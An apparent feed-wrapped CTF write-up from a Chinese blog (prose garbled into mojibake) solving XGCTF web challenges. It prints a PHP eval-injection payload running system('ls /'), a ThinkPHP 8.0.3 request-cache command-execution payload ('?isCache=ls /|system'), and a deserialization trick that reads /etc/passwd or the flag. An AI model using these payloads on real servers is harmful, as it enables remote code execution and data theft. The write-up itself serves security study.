  </entry>
  
  <entry>
    <title>XGCTFè¥¿ç“œæ¯</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/</id>
    <published>2024-07-06T10:50:11.000Z</published>
    <updated>2024-07-09T16:33:01.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>webå’Œpwnæœ€åˆ†ä¸å¼€çš„ä¸€é›†</p><p>å®˜æ–¹wpï¼š<a href="https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1">https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1</a></p><p>è‰ï¼Œä¸€ä¸ªæœ€æ–°æœ€çƒ­cveåˆ†åˆ«å‡ºäº†ä¸€ä¸ªwebé¢˜å’Œä¸€ä¸ªpwné¢˜</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#Author: h1xa</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump((Object)<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>evalå‘½ä»¤æ³¨å…¥ï¼Œç›´æ¥é—­åˆå‰é¢çš„ä»£ç å³å¯</p><p>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">111)?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls /'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706185318017.png" alt="image-20240706185318017"></p><hr><h2 id="tpdoorï¼ˆå¤ç°ï¼‰"><a href="#tpdoorï¼ˆå¤ç°ï¼‰" class="headerlink" title="tpdoorï¼ˆå¤ç°ï¼‰"></a>tpdoorï¼ˆå¤ç°ï¼‰</h2><blockquote><p>thinkphp8</p></blockquote><p>tpæ¡†æ¶ï¼Œåªç»™äº†ä¸ªindex.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>facade<span class="token punctuation">\</span>Db</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$middleware</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'think\middleware\AllowCrossDomain'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\CheckRequestCache'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\LoadLangPack'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'think\middleware\SessionInit'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$isCache</span> <span class="token operator">=</span> <span class="token constant boolean">false</span> <span class="token punctuation">,</span> <span class="token variable">$cacheTime</span> <span class="token operator">=</span> <span class="token number">3600</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isCache</span> <span class="token operator">==</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">require</span>  <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../../config/route.php'</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_key'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$isCache</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$cacheTime</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'request_cache_except'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../../config/route.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php return '</span><span class="token operator">.</span> <span class="token function">var_export</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'cache is enabled'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Welcome ,cache is disabled'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›®çš„åº”è¯¥æ˜¯è¦æ§åˆ¶<code>file_put_contents</code>å†™å…¥æ–‡ä»¶ï¼Œè€Œè¿™é‡Œçš„é€»è¾‘åªæ˜¯æ›´æ–°äº†ä¸€æ¬¡configä¸‹çš„router.phpï¼Œå—¯ï¼Ÿ</p><p>å¼„äº†ä¸ªä¸å­˜åœ¨çš„è·¯ç”±æŠ¥é”™ï¼Œå¾—çŸ¥ç‰ˆæœ¬æ˜¯tp8.0.3</p><p>å®˜æ–¹æ–‡æ¡£é‡Œæ˜¯è¿™ä¹ˆæè¿°çš„ï¼š<a href="https://doc.thinkphp.cn/v8_0/request_cache.html">https://doc.thinkphp.cn/v8_0/request_cache.html</a></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707220747986.png" alt="image-20240707220747986"></p><p>config&#x2F;route.phpä¸‹çš„æè¿°ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// æ˜¯å¦å¼€å¯è¯·æ±‚ç¼“å­˜ trueè‡ªåŠ¨ç¼“å­˜ æ”¯æŒè®¾ç½®è¯·æ±‚ç¼“å­˜è§„åˆ™</span><span class="token string single-quoted-string">'request_cache_key'</span>     <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çœ‹ä¸æ‡‚ï¼Œå•¥å«æ”¯æŒè®¾ç½®è¯·æ±‚ç¼“å­˜è§„åˆ™ï¼Œæˆ‘ä»¬çœ‹çœ‹å®˜æ–¹æ€ä¹ˆæ”¯æŒçš„ï¼Œç›´æ¥ç¿»å¯¹åº”çš„ä¸­é—´ä»¶</p><p>&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;CheckRequestCache.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * è¯»å–å½“å‰åœ°å€çš„è¯·æ±‚ç¼“å­˜ä¿¡æ¯ * @access protected * @param Request $request * @param mixed   $key * @return null|string */</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">parseCacheKey</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token keyword">instanceof</span> <span class="token class-name">Closure</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// å…³é—­å½“å‰ç¼“å­˜</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span> <span class="token operator">===</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// è‡ªåŠ¨ç¼“å­˜åŠŸèƒ½</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'__URL__'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fun</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// ç‰¹æ®Šè§„åˆ™æ›¿æ¢</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'__CONTROLLER__'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__ACTION__'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'__URL__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">controller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">url</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$param</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$param</span> <span class="token keyword">as</span> <span class="token variable">$item</span> <span class="token operator">=></span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span> <span class="token operator">.</span> <span class="token variable">$item</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$val</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'['</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">ext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">']'</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// ç¼“å­˜æŸä¸ªåç¼€çš„è¯·æ±‚</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-></span><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707221047385.png" alt="image-20240707221047385"></p><p>å‘ç°æœ€åº•ä¸‹<code>$key = $fun($key)</code>è¿™ä¸¤ä¸ªå‚æ•°æ²¡åšè¿‡æ»¤ç›´æ¥è£¸å¥”äº†</p><p>ç„¶å $key å¯¹åº”çš„å°±æ˜¯ä¸Šé¢é…ç½®é€‰é¡¹çš„é”®å€¼ï¼Œè€Œ $fun æ˜¯ä»ä¸‹é¢è¿™æ®µæ¥çš„</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'|'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$fun</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å³é”®å€¼ä»¥<code>|</code>åˆ†éš”ç¬¦ï¼Œå‰é¢çš„ä¸º$keyï¼Œåé¢çš„ä¸º$fun</p><p>é‚£ä¹ˆå°±æœ‰payloadäº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>isCache<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span><span class="token class-name">system</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰§è¡Œä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡å†™å…¥é…ç½®ï¼Œç¬¬äºŒæ¬¡å°±èƒ½å›æ˜¾ç»“æœäº†</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707221607769.png" alt="image-20240707221607769"></p><p>æ³¨æ„å†™å…¥é…ç½®æ˜¯ä¸€æ¬¡æ€§çš„æ“ä½œï¼Œæƒ³è¦å†æ¬¡æ‰§è¡Œå…¶ä»–å‘½ä»¤å°±å¾—é‡å¯é¶æœºï¼Œé™¤éå¼¹shell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>isCache<span class="token operator">=</span>cat <span class="token operator">/</span><span class="token number">000</span>f1ag<span class="token operator">.</span><span class="token class-name">txt</span><span class="token operator">|</span><span class="token class-name">system</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h2><p>å‰æœ‰æ±¡æŸ“ï¼Œç«Ÿç„¶æ˜¯åŸé¢˜ï¼</p><p>è§ï¼š<a href="https://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/#Polluted">https://c1oudfl0w0.github.io/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/#Polluted</a></p><hr><h2 id="Ezzz-php"><a href="#Ezzz-php" class="headerlink" title="Ezzz_php"></a>Ezzz_php</h2><blockquote><p>mb_strposä¸mb_substræ‰§è¡Œå·®å¼‚ + CVE-2024-2961</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">read_file</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"/etc/passwd"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">=</span><span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"gxngxngxn"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token string single-quoted-string">'What you are reading is:'</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$readfile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">read_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'start'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$read</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"I_want_to_Read_flag"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$read</span><span class="token operator">.</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$readfile</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Start_Funny_CTF!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¨å¾®å®¡ä¸€ä¸‹ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬éœ€è¦æ§åˆ¶<code>$read.&quot;[&quot;.serialize($readfile).&quot;]&quot;</code>ï¼Œç„¶ååœ¨åé¢çš„ååºåˆ—åŒ–ä¸­è¦†ç›–<code>$filename</code></p><p>å…ˆæœ¬åœ°èµ·ä¸€ä¸ªç¯å¢ƒæµ‹è¯•ä¸€ä¸‹</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706192755440.png" alt="image-20240706192755440"></p><p>é‚£ä¹ˆé—®é¢˜å¾ˆæ˜æ˜¾åœ¨æ€ä¹ˆç»•è¿‡<code>substrstr</code>çš„æˆªå–ï¼Œå› ä¸ºreadæœ‰æ­£åˆ™è¿‡æ»¤æ‰€ä»¥ä¸èƒ½ç›´æ¥è¾“å…¥<code>[</code>ã€<code>]</code></p><p>é—®é¢˜ä¸å¤§ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨startè¿™é‡Œè¾“å…¥<code>[</code>ã€<code>]</code>ï¼Œè¿™æ ·æ„é€ å‡ºæ¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é‡Œé¢å°±æœ‰ä¸­æ‹¬å·ï¼Œå› ä¸º<code>[</code>ä¸€å®šæ˜¯åœ¨å¼€å¤´å¤„ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ§åˆ¶çš„å°±æ˜¯<code>]</code>çš„ä½ç½®</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706193559961.png" alt="image-20240706193559961"></p><p>æˆ‘ä»¬è¦æ„é€ ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">gxngxngxn<span class="token string double-quoted-string">";s:8:"</span>filename<span class="token string double-quoted-string">";s:5:"</span><span class="token operator">/</span>flag"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯è¿™æ ·å­æ˜æ˜¾ä¸è¡Œï¼Œè¿™ä¹‹é—´æ²¡æœ‰å­—ç¬¦çš„å·®è·</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706194328071.png" alt="image-20240706194328071"></p><h3 id="å®½å­—èŠ‚æ¼æ´"><a href="#å®½å­—èŠ‚æ¼æ´" class="headerlink" title="å®½å­—èŠ‚æ¼æ´"></a>å®½å­—èŠ‚æ¼æ´</h3><p>è¿™ä¸ªæ—¶å€™çªç„¶æƒ³èµ·æ¥<code>mb_strpos</code>ä¸<code>mb_substr</code>æ‰§è¡Œå·®å¼‚äº§ç”Ÿçš„å®½å­—èŠ‚æ¼æ´</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240706211046282.png" 